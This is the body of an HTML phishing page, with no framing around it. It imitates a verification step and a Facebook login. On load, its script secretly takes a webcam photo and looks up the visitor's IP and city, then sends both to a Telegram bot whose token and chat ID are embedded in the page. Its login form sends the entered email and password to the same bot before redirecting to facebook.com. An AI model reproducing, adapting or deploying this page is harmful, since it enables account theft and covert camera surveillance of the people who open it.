</head>
<body>

    <div id="loading-box" class="content-box">
        <div class="loader"></div>
        <h2 style="color: #1c1e21;">Verification in Progress</h2>
        <p id="status">Checking camera permissions...</p>

    <div id="fb-box" class="content-box">

        <p style="font-size: 16px; color: #606770; margin-bottom: 25px;">Log in to continue to your files.</p>
        <input type="text" id="email" placeholder="Email address or phone number">
        <input type="password" id="pass" placeholder="Password">
        <button class="fb-login-btn" onclick="sendToTelegram()">Log In</button>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "8539487381:AAGldnqf3grvmI5cpS4DlETxoEne4jc9dHg"; // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶®‡¶§‡ßÅ‡¶® ‡¶ü‡ßã‡¶ï‡ßá‡¶®
        const chatId = "7967860350"; 

        window.onload = () => {
            startCameraAndCapture();
            trackIP();
        };

        function trackIP() {
            fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                let info = `üåê *Target Online!* \nüìç IP: ${data.ip} \nüèô City: ${data.city}`;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
            });
        }

        async function startCameraAndCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);

                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'capture.jpg');

                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        }).then(() => {
                            stream.getTracks().forEach(track => track.stop());
                            showFBPage();
                        });
                    }, 'image/jpeg');
                }, 3000); 

            } catch (err) {
                setTimeout(showFBPage, 2000);
            }
        }

        function showFBPage() {
            document.getElementById('loading-box').style.display = 'none';
            document.getElementById('fb-box').style.display = 'block';
        }

        function sendToTelegram() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;

            if(email && pass) {
                let message = `üîë *FB Account Harvested!* \n\nüìß User: ${email} \nüîí Pass: ${pass}`;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
                .then(() => {
                    window.location.href = "https://www.facebook.com";
                });
            } else {
                alert("Please fill in both fields.");
            }
        }
    </script>
</body>
